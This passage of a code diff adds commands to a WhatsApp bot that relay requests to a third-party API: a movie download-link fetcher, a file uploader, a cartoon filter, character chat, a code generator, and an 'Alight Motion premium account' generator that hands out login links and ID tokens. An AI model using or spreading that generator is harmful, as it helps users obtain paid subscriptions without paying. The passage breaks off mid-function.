+        text: `🎬 *Sinhalasub Movie/TV Downloader*\n\n*Actions:*\n• ${prefix}${command} home - Browse recent/popular\n• ${prefix}${command} search <query> - Search movies\n• ${prefix}${command} detail <url_or_id> - Get movie details & download links\n• ${prefix}${command} trending - Trending movies\n• ${prefix}${command} imdb - IMDB top movies\n• ${prefix}${command} genre <genre> - Browse by genre\n\n*Examples:*\n${prefix}${command} home\n${prefix}${command} search transformers\n${prefix}${command} detail https://sinhalasub.lk/movie/xxxxx\n${prefix}${command} trending\n${prefix}${command} genre action` 
+      });
+    }
+
+    const action = args[0].toLowerCase();
+    const query = args.slice(1).join(" ");
+
+    await sock.sendMessage(from, { text: `⏳ Fetching data...` });
+
+    try {
+      // ==========================================================
+      // Call Sinhalasub API
+      // ==========================================================
+      const baseUrl = 'https://omegatech-api.dixonomega.tech';
+      const apiUrl = new URL(`${baseUrl}/api/movie/sinhalasub`);
+      
+      apiUrl.searchParams.append('action', action);
+      
+      if (action === 'search' && query) {
+        apiUrl.searchParams.append('q', query);
+      } else if (action === 'detail' && query) {
+        // query can be URL or ID
+        apiUrl.searchParams.append('id', query);
+      } else if (action === 'listing' && query) {
+        apiUrl.searchParams.append('path', query);
+        if (args[2]) apiUrl.searchParams.append('page', args[2]);
+      } else if (action === 'genre' && query) {
+        apiUrl.searchParams.append('genre', query);
+        if (args[2]) apiUrl.searchParams.append('page', args[2]);
+      } else if (['home', 'trending', 'imdb'].includes(action)) {
+        // No additional params needed
+        if (args[1]) apiUrl.searchParams.append('page', args[1]);
+      } else {
+        return await sock.sendMessage(from, { 
+          text: `❌ Invalid action. Use: home, search, detail, trending, imdb, genre` 
+        });
+      }
+
+      const response = await fetch(apiUrl.toString(), {
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+          'Accept': 'application/json'
+        }
+      });
+
+      if (!response.ok) {
+        throw new Error(`API returned ${response.status}`);
+      }
+
+      const data = await response.json();
+
+      // ==========================================================
+      // Handle different actions
+      // ==========================================================
+      
+      // --- HOME / TRENDING / IMDB / GENRE / SEARCH (list view) ---
+      if (['home', 'search', 'trending', 'imdb', 'genre', 'listing'].includes(action)) {
+        let movies = data.result || data.movies || data.data || data.results || [];
+        
+        if (!movies.length) {
+          return await sock.sendMessage(from, { 
+            text: `❌ No movies found for "${query || action}".` 
+          });
+        }
+
+        const maxDisplay = Math.min(movies.length, 15);
+        let msg = `🎬 *Sinhalasub${action === 'search' ? ` Search: ${query}` : ` - ${action.toUpperCase()}`}*\n`;
+        msg += `📊 Showing ${maxDisplay} of ${movies.length}\n\n`;
+
+        for (let i = 0; i < maxDisplay; i++) {
+          const m = movies[i];
+          const title = m.title || m.name || m.movie || 'Unknown';
+          const year = m.year || m.release || '';
+          const rating = m.rating || m.imdb || '';
+          const url = m.url || m.link || m.id || '';
+          
+          msg += `• *${title}*`;
+          if (year) msg += ` (${year})`;
+          if (rating) msg += ` ⭐${rating}`;
+          msg += `\n`;
+          if (url) msg += `  🔗 ${url}\n`;
+          msg += `\n`;
+        }
+
+        msg += `\n💡 Use: ${prefix}${command} detail <url> for download links`;
+        await sock.sendMessage(from, { text: msg });
+        return;
+      }
+
+      // --- DETAIL (single movie with download links) ---
+      if (action === 'detail') {
+        const detail = data.result || data.movie || data.data || data;
+        
+        if (!detail || !detail.title) {
+          return await sock.sendMessage(from, { 
+            text: `❌ Movie details not found. Check the URL/ID.` 
+          });
+        }
+
+        const title = detail.title || 'Unknown';
+        const year = detail.year || detail.release || '';
+        const rating = detail.rating || detail.imdb || '';
+        const genre = detail.genre || detail.genres || '';
+        const cast = detail.cast || detail.actors || '';
+        const plot = detail.plot || detail.description || detail.synopsis || '';
+        const poster = detail.poster || detail.image || detail.thumbnail || '';
+        const downloadLinks = detail.downloads || detail.links || detail.download || [];
+
+        let msg = `🎬 *${title}*`;
+        if (year) msg += ` (${year})`;
+        msg += `\n\n`;
+
+        if (rating) msg += `⭐ *Rating:* ${rating}\n`;
+        if (genre) msg += `📂 *Genre:* ${genre}\n`;
+        if (cast) msg += `🎭 *Cast:* ${cast}\n`;
+        if (plot) msg += `📝 *Plot:* ${plot.slice(0, 200)}${plot.length > 200 ? '...' : ''}\n\n`;
+
+        msg += `📥 *Download Links:*\n`;
+
+        if (downloadLinks && downloadLinks.length) {
+          const maxLinks = Math.min(downloadLinks.length, 8);
+          for (let i = 0; i < maxLinks; i++) {
+            const link = downloadLinks[i];
+            const label = link.label || link.quality || link.name || `Link ${i+1}`;
+            const url = link.url || link.link || link;
+            if (url) {
+              msg += `• *${label}*: ${url}\n`;
+            }
+          }
+          if (downloadLinks.length > 8) {
+            msg += `\n*...and ${downloadLinks.length - 8} more links.*`;
+          }
+        } else {
+          msg += `• No download links available\n`;
+        }
+
+        // Send poster if available
+        if (poster) {
+          try {
+            await sock.sendMessage(from, {
+              image: { url: poster },
+              caption: msg
+            });
+          } catch (imgErr) {
+            await sock.sendMessage(from, { text: msg });
+          }
+        } else {
+          await sock.sendMessage(from, { text: msg });
+        }
+        return;
+      }
+
+      // ==========================================================
+      // If we get here, something went wrong
+      // ==========================================================
+      await sock.sendMessage(from, { 
+        text: `❌ No results found. Check your query or try again.` 
+      });
+
+    } catch (error) {
+      console.error('Sinhalasub error:', error);
+      await sock.sendMessage(from, { 
+        text: `⚠️ Error: ${error.message || 'Could not fetch data.'}\n\n💡 Try:\n• ${prefix}${command} home\n• ${prefix}${command} search avengers\n• ${prefix}${command} detail <url>\n• ${prefix}${command} trending` 
+      });
+    }
+  }
+});
+register({
+  name: 'upload',
+  aliases: ['kappa', 'uploadfile', 'filehost'],
+  category: 'TOOLS',
+  description: 'Upload files to kappa.lol (permanent hosting) - reply to a file',
+  async execute({ sock, from, msg, quoted, args, prefix, command }) {
+    // ==========================================================
+    // Check if replying to a file
+    // ==========================================================
+    const target = quoted || msg;
+    
+    // Check for various file types
+    let fileBuffer = null;
+    let fileName = 'file';
+    let mimeType = 'application/octet-stream';
+    let hasFile = false;
+
+    // Check image
+    if (target.message?.imageMessage) {
+      hasFile = true;
+      fileName = target.message.imageMessage.caption || 'image.jpg';
+      mimeType = target.message.imageMessage.mimetype || 'image/jpeg';
+    }
+    // Check video
+    else if (target.message?.videoMessage) {
+      hasFile = true;
+      fileName = 'video.mp4';
+      mimeType = target.message.videoMessage.mimetype || 'video/mp4';
+    }
+    // Check audio
+    else if (target.message?.audioMessage) {
+      hasFile = true;
+      fileName = 'audio.mp3';
+      mimeType = target.message.audioMessage.mimetype || 'audio/mpeg';
+    }
+    // Check document
+    else if (target.message?.documentMessage) {
+      hasFile = true;
+      fileName = target.message.documentMessage.fileName || 'document';
+      mimeType = target.message.documentMessage.mimetype || 'application/octet-stream';
+    }
+    // Check sticker
+    else if (target.message?.stickerMessage) {
+      hasFile = true;
+      fileName = 'sticker.webp';
+      mimeType = 'image/webp';
+    }
+
+    if (!hasFile) {
+      return await sock.sendMessage(from, { 
+        text: `📤 *Kappa Uploader*\n\nUsage: Reply to a file with: ${prefix}${command}\n\n*Supported files:*\n• Images (jpg, png, gif, webp)\n• Videos (mp4, mov, avi)\n• Audio (mp3, wav, ogg)\n• Documents (pdf, zip, txt, etc.)\n• Stickers\n\n*Note:* Files are uploaded to kappa.lol (permanent hosting).` 
+      });
+    }
+
+    await sock.sendMessage(from, { text: `⏳ Uploading ${fileName}...` });
+
+    try {
+      // ==========================================================
+      // Download the file from WhatsApp
+      // ==========================================================
+      const { downloadMediaMessage } = require('@whiskeysockets/baileys');
+      
+      let fileBuffer = null;
+      try {
+        fileBuffer = await downloadMediaMessage(
+          target.message || target,
+          'buffer',
+          {},
+          { reuploadRequest: sock.updateMediaMessage }
+        );
+      } catch (dlErr) {
+        fileBuffer = await sock.downloadMediaMessage(target);
+      }
+
+      if (!fileBuffer || fileBuffer.length < 100) {
+        return await sock.sendMessage(from, { 
+          text: `❌ Failed to download file. Please try again.` 
+        });
+      }
+
+      // ==========================================================
+      // Create FormData for upload
+      // ==========================================================
+      const FormData = require('form-data');
+      const form = new FormData();
+      
+      // Add file to form data
+      form.append('file', fileBuffer, {
+        filename: fileName,
+        contentType: mimeType
+      });
+
+      // ==========================================================
+      // Upload to Kappa
+      // ==========================================================
+      const baseUrl = 'https://omegatech-api.dixonomega.tech';
+      const response = await fetch(`${baseUrl}/api/tools/Kappa-uploader`, {
+        method: 'POST',
+        headers: {
+          ...form.getHeaders(),
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        },
+        body: form
+      });
+
+      if (!response.ok) {
+        throw new Error(`Upload failed: ${response.status}`);
+      }
+
+      const data = await response.json();
+
+      // ==========================================================
+      // Extract download link
+      // ==========================================================
+      let downloadUrl = data.result?.url || data.result?.download_url || 
+                        data.url || data.download_url || data.link || data.file;
+
+      if (!downloadUrl) {
+        const jsonString = JSON.stringify(data);
+        const urlMatch = jsonString.match(/https?:\/\/[^\s"']+/i);
+        if (urlMatch) downloadUrl = urlMatch[0];
+      }
+
+      if (!downloadUrl) {
+        return await sock.sendMessage(from, { 
+          text: `❌ Upload completed but no download link was returned.` 
+        });
+      }
+
+      // ==========================================================
+      // Send the download link
+      // ==========================================================
+      const fileSize = (fileBuffer.length / 1024 / 1024).toFixed(2);
+      
+      await sock.sendMessage(from, {
+        text: `📤 *File Uploaded Successfully!*\n\n` +
+          `📁 *File:* ${fileName}\n` +
+          `📦 *Size:* ${fileSize} MB\n` +
+          `🔗 *Download Link:*\n${downloadUrl}\n\n` +
+          `📌 *Powered by Kappa.lol*\n` +
+          `✅ *Permanent Hosting*`
+      });
+
+    } catch (error) {
+      console.error('Upload error:', error);
+      await sock.sendMessage(from, { 
+        text: `⚠️ Upload Error: ${error.message || 'Could not upload file.'}\n\n💡 Try:\n• A smaller file\n• A different file type\n• Check your internet connection` 
+      });
+    }
+  }
+});
+register({
+  name: 'tocartoon',
+  aliases: ['cartoon', 'cartoonify', 'toon', 'animeify'],
+  category: 'TOOLS',
+  description: 'Convert a normal image into a realistic cartoon-style artwork',
+  async execute({ sock, from, msg, quoted, args, prefix, command }) {
+    // ==========================================================
+    // Check if user provided a URL or replied to an image
+    // ==========================================================
+    let imageUrl = null;
+    const target = quoted || msg;
+
+    // Check if user provided a URL as argument
+    if (args[0] && args[0].startsWith('http')) {
+      imageUrl = args[0];
+    }
+    // Check if replying to an image
+    else if (target.message?.imageMessage) {
+      imageUrl = target.message.imageMessage.url || target.message.imageMessage.caption;
+    }
+    // Check if replying to a document (image)
+    else if (target.message?.documentMessage?.mimetype?.includes('image')) {
+      imageUrl = target.message.documentMessage.url;
+    }
+    // Check if replying to a sticker
+    else if (target.message?.stickerMessage) {
+      imageUrl = target.message.stickerMessage.url;
+    }
+
+    if (!imageUrl) {
+      return await sock.sendMessage(from, { 
+        text: `🎨 *Cartoonify Image*\n\nUsage: ${prefix}${command} <image_url>\nOr reply to an image with: ${prefix}${command}\n\n*Examples:*\n${prefix}${command} https://example.com/photo.jpg\nReply to a photo with ${prefix}${command}\n\n*Supports:*\n• Images (jpg, png, jpeg)\n• Stickers (webp)\n• Any image URL` 
+      });
+    }
+
+    await sock.sendMessage(from, { text: `🎨 *Converting image to cartoon...*\n⏳ This may take 5-10 seconds...` });
+
+    try {
+      // ==========================================================
+      // Call OmegaTech ToCartoon API
+      // ==========================================================
+      const baseUrl = 'https://omegatech-api.dixonomega.tech';
+      const apiUrl = new URL(`${baseUrl}/api/tools/tocartoon`);
+      apiUrl.searchParams.append('image', imageUrl);
+
+      const response = await fetch(apiUrl.toString(), {
+        method: 'GET',
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+          'Accept': 'application/json'
+        }
+      });
+
+      if (!response.ok) {
+        throw new Error(`API returned ${response.status}`);
+      }
+
+      const data = await response.json();
+
+      // ==========================================================
+      // Extract cartoon image URL
+      // ==========================================================
+      let cartoonUrl = data.result?.url || data.result?.image || data.result?.cartoon || 
+                       data.url || data.image || data.cartoon || data.data;
+
+      if (!cartoonUrl) {
+        const jsonString = JSON.stringify(data);
+        const urlMatch = jsonString.match(/https?:\/\/[^\s"']+\.(png|jpg|jpeg|gif|webp)/i);
+        if (urlMatch) cartoonUrl = urlMatch[0];
+      }
+
+      if (!cartoonUrl) {
+        return await sock.sendMessage(from, { 
+          text: `❌ Could not convert image to cartoon. Please try a different image.` 
+        });
+      }
+
+      // ==========================================================
+      // Download and send the cartoon image
+      // ==========================================================
+      const imageResponse = await fetch(cartoonUrl, {
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        }
+      });
+
+      if (!imageResponse.ok) {
+        throw new Error(`Failed to download cartoon: ${imageResponse.status}`);
+      }
+
+      const cartoonBuffer = Buffer.from(await imageResponse.arrayBuffer());
+
+      if (cartoonBuffer.length < 1000) {
+        return await sock.sendMessage(from, { 
+          text: `❌ Generated cartoon image is too small. Please try again.` 
+        });
+      }
+
+      const fileSize = (cartoonBuffer.length / 1024).toFixed(1);
+
+      // ==========================================================
+      // Send the cartoon image
+      // ==========================================================
+      await sock.sendMessage(from, {
+        image: cartoonBuffer,
+        caption: `🎨 *Cartoonified Image*\n\n📦 *Size:* ${fileSize} KB\n\n✅ *Successfully converted to cartoon style*\n\n✨ _Powered by OmegaTech_`
+      });
+
+    } catch (error) {
+      console.error('Cartoonify error:', error);
+      await sock.sendMessage(from, { 
+        text: `⚠️ Error: ${error.message || 'Could not convert image.'}\n\n💡 Try:\n• A different image\n• A clearer photo\n• A URL instead of a file\n• ${prefix}${command} https://example.com/photo.jpg` 
+      });
+    }
+  }
+});
+register({
+  name: 'meta',
+  aliases: ['metabots', 'aichat', 'coze', 'character'],
+  category: 'AI',
+  description: 'Chat with AI characters/bots from Meta (Coze/Anime/Diverse categories)',
+  async execute({ sock, from, args, prefix, command, sessionId }) {
+    // ==========================================================
+    // Check if user provided an action
+    // ==========================================================
+    if (!args[0]) {
+      return await sock.sendMessage(from, { 
+        text: `🧠 *Meta AI Characters*\n\n*Actions:*\n• ${prefix}${command} categories - List all bot categories\n• ${prefix}${command} bots <category_id> - List bots in a category\n• ${prefix}${command} chat <bot_id> <message> - Chat with a bot\n• ${prefix}${command} search <query> - Search for a character\n\n*Quick examples:*\n${prefix}${command} categories\n${prefix}${command} bots 17\n${prefix}${command} chat 2 Hello Gojo!\n${prefix}${command} search anime` 
+      });
+    }
+
+    const action = args[0].toLowerCase();
+    const query = args.slice(1).join(" ");
+
+    try {
+      const baseUrl = 'https://omegatech-api.dixonomega.tech';
+      const apiUrl = new URL(`${baseUrl}/api/ai/Meta`);
+
+      // ==========================================================
+      // Action: categories - List all categories
+      // ==========================================================
+      if (action === 'categories') {
+        apiUrl.searchParams.append('action', 'categories');
+        
+        const response = await fetch(apiUrl.toString(), {
+          headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+        });
+
+        if (!response.ok) throw new Error(`API returned ${response.status}`);
+        const data = await response.json();
+
+        let categories = data.data || data.result || [];
+        if (!categories.length) {
+          return await sock.sendMessage(from, { text: '❌ No categories found.' });
+        }
+
+        let msg = `📂 *Meta Bot Categories (${categories.length})*\n\n`;
+        for (const cat of categories) {
+          const id = cat.id || cat.cid || '?';
+          const name = cat.cname || cat.name || cat.category || 'Unknown';
+          const count = cat.bots?.length || cat.count || 0;
+          msg += `• *${name}* (ID: ${id}) — ${count} bots\n`;
+        }
+        msg += `\n💡 Use: ${prefix}${command} bots <category_id> to see bots`;
+        await sock.sendMessage(from, { text: msg });
+        return;
+      }
+
+      // ==========================================================
+      // Action: bots - List bots in a category
+      // ==========================================================
+      if (action === 'bots') {
+        if (!query) {
+          return await sock.sendMessage(from, { 
+            text: `❌ Please provide a category ID.\n\nUsage: ${prefix}${command} bots <category_id>\nExample: ${prefix}${command} bots 17\n\n💡 Use ${prefix}${command} categories to see all IDs.` 
+          });
+        }
+
+        apiUrl.searchParams.append('action', 'categories');
+        apiUrl.searchParams.append('cateid', query);
+
+        const response = await fetch(apiUrl.toString(), {
+          headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+        });
+
+        if (!response.ok) throw new Error(`API returned ${response.status}`);
+        const data = await response.json();
+
+        let bots = data.data || data.result || [];
+        if (!bots.length) {
+          return await sock.sendMessage(from, { text: `❌ No bots found in category ${query}.` });
+        }
+
+        let msg = `🤖 *Bots in Category ${query} (${bots.length})*\n\n`;
+        for (const bot of bots) {
+          const id = bot.id || bot.bot_id || '?';
+          const name = bot.bot_name || bot.name || 'Unknown';
+          const desc = bot.description || bot.desc || '';
+          const vip = bot.is_vip ? '⭐' : '';
+          msg += `• *${name}* ${vip} (ID: ${id})\n`;
+          if (desc) msg += `  ${desc.slice(0, 60)}${desc.length > 60 ? '...' : ''}\n`;
+          msg += `\n`;
+        }
+        msg += `💡 Use: ${prefix}${command} chat <bot_id> <message> to chat\n`;
+        msg += `Example: ${prefix}${command} chat 2 Hello Gojo!`;
+        await sock.sendMessage(from, { text: msg });
+        return;
+      }
+
+      // ==========================================================
+      // Action: chat - Chat with a specific bot
+      // ==========================================================
+      if (action === 'chat') {
+        const parts = query.split(' ');
+        if (parts.length < 2) {
+          return await sock.sendMessage(from, { 
+            text: `❌ Usage: ${prefix}${command} chat <bot_id> <message>\n\nExample: ${prefix}${command} chat 2 Hello Gojo!\n\n💡 Use ${prefix}${command} bots 17 to see bot IDs.` 
+          });
+        }
+
+        const botId = parts[0];
+        const message = parts.slice(1).join(' ');
+
+        // Generate session ID for this user and bot
+        const userSessionId = sessionId || from.split('@')[0];
+        const sessionKey = `meta_${userSessionId}_${botId}`;
+
+        apiUrl.searchParams.append('action', 'chat');
+        apiUrl.searchParams.append('bot_id', botId);
+        apiUrl.searchParams.append('prompt', message);
+        apiUrl.searchParams.append('sessionId', sessionKey);
+
+        await sock.sendMessage(from, { text: `🧠 *Meta AI thinking...*` });
+
+        const response = await fetch(apiUrl.toString(), {
+          headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+        });
+
+        if (!response.ok) throw new Error(`API returned ${response.status}`);
+        const data = await response.json();
+
+        let reply = data.result || data.response || data.reply || data.message || data.text;
+
+        if (!reply) {
+          const jsonString = JSON.stringify(data);
+          const textMatch = jsonString.match(/"result":"([^"]+)"/) || 
+                            jsonString.match(/"response":"([^"]+)"/) ||
+                            jsonString.match(/"reply":"([^"]+)"/) ||
+                            jsonString.match(/"message":"([^"]+)"/);
+          if (textMatch) reply = textMatch[1];
+        }
+
+        if (!reply) {
+          return await sock.sendMessage(from, { text: `❌ No response from the bot.` });
+        }
+
+        reply = reply.replace(/\\n/g, '\n').replace(/\\"/g, '"').replace(/\\t/g, '  ');
+        if (reply.length > 65000) reply = reply.slice(0, 65000) + '\n\n... (truncated)';
+
+        if (reply.length > 1000) {
+          const chunks = reply.match(/[^\n]{1,1000}(?:\n|$)/g) || [reply];
+          for (let i = 0; i < Math.min(chunks.length, 5); i++) {
+            const chunk = chunks[i].trim();
+            if (!chunk) continue;
+            const prefix = i === 0 ? `🧠 *Meta AI (${botId}):*\n\n` : `\n*...continued*\n\n`;
+            await sock.sendMessage(from, { text: prefix + chunk });
+            await new Promise(r => setTimeout(r, 300));
+          }
+        } else {
+          await sock.sendMessage(from, { 
+            text: `🧠 *Meta AI (${botId}):*\n\n${reply}` 
+          });
+        }
+        return;
+      }
+
+      // ==========================================================
+      // Action: search - Search for bots by keyword
+      // ==========================================================
+      if (action === 'search') {
+        if (!query) {
+          return await sock.sendMessage(from, { 
+            text: `❌ Please provide a search query.\n\nUsage: ${prefix}${command} search <keyword>\nExample: ${prefix}${command} search anime` 
+          });
+        }
+
+        apiUrl.searchParams.append('action', 'search');
+        apiUrl.searchParams.append('query', query);
+
+        const response = await fetch(apiUrl.toString(), {
+          headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+        });
+
+        if (!response.ok) throw new Error(`API returned ${response.status}`);
+        const data = await response.json();
+
+        let results = data.data || data.result || [];
+        if (!results.length) {
+          return await sock.sendMessage(from, { text: `❌ No bots found for "${query}".` });
+        }
+
+        let msg = `🔍 *Search Results for "${query}" (${results.length})*\n\n`;
+        for (const bot of results.slice(0, 15)) {
+          const id = bot.id || bot.bot_id || '?';
+          const name = bot.bot_name || bot.name || 'Unknown';
+          const desc = bot.description || bot.desc || '';
+          msg += `• *${name}* (ID: ${id})\n`;
+          if (desc) msg += `  ${desc.slice(0, 60)}${desc.length > 60 ? '...' : ''}\n\n`;
+        }
+        if (results.length > 15) {
+          msg += `\n*...and ${results.length - 15} more.*`;
+        }
+        msg += `\n💡 Use: ${prefix}${command} chat <bot_id> <message> to chat`;
+        await sock.sendMessage(from, { text: msg });
+        return;
+      }
+
+      // ==========================================================
+      // Invalid action
+      // ==========================================================
+      await sock.sendMessage(from, { 
+        text: `❌ Invalid action. Use: categories, bots, chat, search\n\n💡 ${prefix}${command} categories to start.` 
+      });
+
+    } catch (error) {
+      console.error('Meta error:', error);
+      await sock.sendMessage(from, { 
+        text: `⚠️ Error: ${error.message || 'Could not reach Meta API.'}\n\n💡 Try:\n• ${prefix}${command} categories\n• ${prefix}${command} bots 17\n• ${prefix}${command} chat 2 Hello` 
+      });
+    }
+  }
+});
+register({
+  name: 'alightgen',
+  aliases: ['alight', 'amprem', 'alightprem', 'amgen'],
+  category: 'TOOLS',
+  description: 'Generate Alight Motion premium account credentials',
+  async execute({ sock, from, args, prefix, command }) {
+    await sock.sendMessage(from, { text: `⏳ Generating Alight Motion premium account...` });
+
+    try {
+      // ==========================================================
+      // Call OmegaTech Alight Motion Generator API
+      // ==========================================================
+      const baseUrl = 'https://omegatech-api.dixonomega.tech';
+      const apiUrl = new URL(`${baseUrl}/api/tools/Alightmotion-Prem-gen`);
+      apiUrl.searchParams.append('action', 'generate');
+
+      const response = await fetch(apiUrl.toString(), {
+        method: 'GET',
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+          'Accept': 'application/json'
+        }
+      });
+
+      if (!response.ok) {
+        throw new Error(`API returned ${response.status}`);
+      }
+
+      const data = await response.json();
+
+      // ==========================================================
+      // Check if generation was successful
+      // ==========================================================
+      if (!data.success) {
+        return await sock.sendMessage(from, { 
+          text: `❌ Account generation failed.\n\n💡 Try again later.` 
+        });
+      }
+
+      const accounts = data.data?.accounts || [];
+      
+      if (!accounts.length) {
+        return await sock.sendMessage(from, { 
+          text: `❌ No accounts generated. Please try again.` 
+        });
+      }
+
+      const account = accounts[0];
+      
+      // ==========================================================
+      // Extract account details
+      // ==========================================================
+      const email = account.email || 'N/A';
+      const link = account.link || 'N/A';
+      const status = account.status ? '✅ Valid' : '❌ Invalid';
+      
+      const idToken = account.data?.idToken || 'N/A';
+      const userId = account.data?.user?.localId || 'N/A';
+      const emailVerified = account.data?.user?.emailVerified ? '✅ Yes' : '❌ No';
+
+      // Premium details
+      const premium = account.data?.premium?.data?.result || {};
+      const isPremium = premium.valid ? '✅ Active' : '❌ Inactive';
+      const autoRenew = premium.autoRenewing ? 'Yes' : 'No';
+      
+      let expiry = 'N/A';
+      if (premium.expiryTimeMillis) {
+        const expiryDate = new Date(parseInt(premium.expiryTimeMillis));
+        expiry = expiryDate.toLocaleString();
+      }
+
+      // ==========================================================
+      // Build response message
+      // ==========================================================
+      const msg = `🎬 *Alight Motion Premium Account*\n\n` +
+        `📧 *Email:* ${email}\n` +
+        `🔗 *Link:* ${link}\n\n` +
+        `📊 *Account Status:* ${status}\n` +
+        `🆔 *User ID:* ${userId}\n` +
+        `📧 *Email Verified:* ${emailVerified}\n\n` +
+        `✨ *Premium Status:* ${isPremium}\n` +
+        `🔄 *Auto-Renew:* ${autoRenew}\n` +
+        `⏰ *Expires:* ${expiry}\n\n` +
+        `🔑 *ID Token:*\n\`${idToken.slice(0, 60)}...\`\n\n` +
+        `📌 *Instructions:*\n` +
+        `1. Open the link in your browser\n` +
+        `2. You'll be automatically signed in\n` +
+        `3. Open Alight Motion and enjoy premium features\n\n` +
+        `⚠️ *Note:* Accounts may expire. Generate a new one if this stops working.\n` +
+        `✨ _Powered by OmegaTech_`;
+
+      // ==========================================================
+      // Send the account details
+      // ==========================================================
+      await sock.sendMessage(from, { text: msg });
+
+    } catch (error) {
+      console.error('Alight Motion generator error:', error);
+      await sock.sendMessage(from, { 
+        text: `⚠️ Error: ${error.message || 'Could not generate account.'}\n\n💡 Try:\n• ${prefix}${command} (retry)\n• Wait a few minutes and try again\n• The generator may be rate-limited` 
+      });
+    }
+  }
+});
+register({
+  name: 'llamacoder',
+  aliases: ['llama', 'coder', 'aicoder', 'llamacode'],
+  category: 'AI',
+  description: 'Generate code/projects with Llamacoder AI (web apps, portfolios, etc.)',
+  async execute({ sock, from, args, prefix, command }) {
+    // ==========================================================
+    // Check if user provided a prompt
+    // ==========================================================
+    if (!args[0]) {
+      return await sock.sendMessage(from, { 
+        text: `🤖 *Llamacoder AI - Code Generator*\n\nUsage: ${prefix}${command} <prompt> [quality]\n\n*Quality options:*\n• low (fast, basic)\n• medium (balanced)\n• high (detailed, full project)\n\n*Examples:*\n${prefix}${command} A simple portfolio\n${prefix}${command} A to-do app with React low\n${prefix}${command} A weather dashboard high\n${prefix}${command} A landing page for a coffee shop medium\n\n*Note:* Generates full project files (React, Next.js, etc.)` 
+      });
+    }
+
+    // ==========================================================
+    // Parse prompt and quality
+    // ==========================================================
+    let prompt = args.join(" ");
+    let quality = 'low'; // default
+
+    // Check if last word is a quality option
+    const lastWord = args[args.length - 1].toLowerCase();
+    if (['low', 'medium', 'high'].includes(lastWord)) {
+      quality = lastWord;
+      prompt = args.slice(0, -1).join(" ");
+    }
+
+    await sock.sendMessage(from, { 
+      text: `🤖 *Llamacoder generating...*\n📝 Prompt: *${prompt}*\n📊 Quality: *${quality}*\n⏳ This may take 10-30 seconds...` 
+    });
+
+    try {
+      // ==========================================================
+      // Call Llamacoder API
+      // ==========================================================
+      const baseUrl = 'https://omegatech-api.dixonomega.tech';
+      const apiUrl = new URL(`${baseUrl}/api/ai/llamacoder`);
+      apiUrl.searchParams.append('action', 'create');
+      apiUrl.searchParams.append('prompt', prompt);
+      apiUrl.searchParams.append('quality', quality);
+
+      const response = await fetch(apiUrl.toString(), {
+        method: 'GET',
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+          'Accept': 'application/json'
+        }
+      });
+
+      if (!response.ok) {
+        throw new Error(`API returned ${response.status}`);
+      }
+
+      const data = await response.json();
+
+      // ==========================================================
+      // Check if generation was successful
+      // ==========================================================
+      if (!data.success) {
+        return await sock.sendMessage(from, { 
+          text: `❌ Generation failed: ${data.message || 'Unknown error'}` 
+        });
+      }
+
+      // ==========================================================
+      // Extract data
+      // ==========================================================
+      const sessionId = data.sessionId || 'N/A';
+      const chatId = data.chatId || 'N/A';
+      const filesCount = data.filesCount || 0;
+      const files = data.files || [];
+
+      // ==========================================================
+      // Build response message
+      // ==========================================================
+      let msg = `🤖 *Llamacoder Generation Complete*\n\n`;
+      msg += `📝 *Prompt:* ${prompt}\n`;
+      msg += `📊 *Quality:* ${quality}\n`;
+      msg += `📁 *Files Generated:* ${filesCount}\n`;
+      msg += `🆔 *Session ID:* ${sessionId}\n`;
+      msg += `💬 *Chat ID:* ${chatId}\n\n`;
+
+      if (files.length) {
+        msg += `📂 *Files Created:*\n`;
+        for (const file of files) {
+          const path = file.path || 'unknown';
+          const content = file.content || '';
+          const preview = content.slice(0, 100).replace(/\n/g, ' ').trim();
+          msg += `• *${path}*\n  \`${preview}${content.length > 100 ? '...' : ''}\`\n\n`;
+        }
+      }
+
+      // ==========================================================
+      // Ask if user wants full code
+      // ==========================================================
+      msg += `\n💡 *To get the full code:*\n`;
+      msg += `${prefix}${command} get ${sessionId}\n\n`;
+      msg += `✨ _Powered by OmegaTech Llamacoder_`;
+
+      await sock.sendMessage(from, { text: msg });
+
+    } catch (error) {
+      console.error('Llamacoder error:', error);
+      await sock.sendMessage(from, { 
+        text: `⚠️ Error: ${error.message || 'Could not generate code.'}\n\n💡 Try:\n• A shorter prompt\n• ${prefix}${command} simple to-do app low\n• ${prefix}${command} portfolio medium\n• Check your internet connection` 
+      });
+    }
+  }
+});
+
+// ==========================================================
+// Sub-command: Get full code from a session
+// ==========================================================
+register({
+  name: 'llamacoder get',
+  aliases: ['llamaget', 'codepull', 'llamafiles'],
+  category: 'AI',
+  description: 'Get full code files from a Llamacoder session',
+  async execute({ sock, from, args, prefix, command }) {
+    if (!args[0]) {
+      return await sock.sendMessage(from, { 
+        text: `📂 *Get Llamacoder Files*\n\nUsage: ${prefix}${command} get <session_id>\nExample: ${prefix}${command} get be7ca71b-f32b-4cc4-b87f-32add052b94e` 
+      });
+    }
+
+    const sessionId = args[0];
+
+    await sock.sendMessage(from, { text: `⏳ Fetching files for session ${sessionId}...` });
+
+    try {
+      const baseUrl = 'https://omegatech-api.dixonomega.tech';
+      const apiUrl = new URL(`${baseUrl}/api/ai/llamacoder`);
+      apiUrl.searchParams.append('action', 'get');
+      apiUrl.searchParams.append('sessionId', sessionId);
+
+      const response = await fetch(apiUrl.toString(), {
+        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+      });
+
+      if (!response.ok) throw new Error(`API returned ${response.status}`);
+      const data = await response.json();
+
+      if (!data.success) {
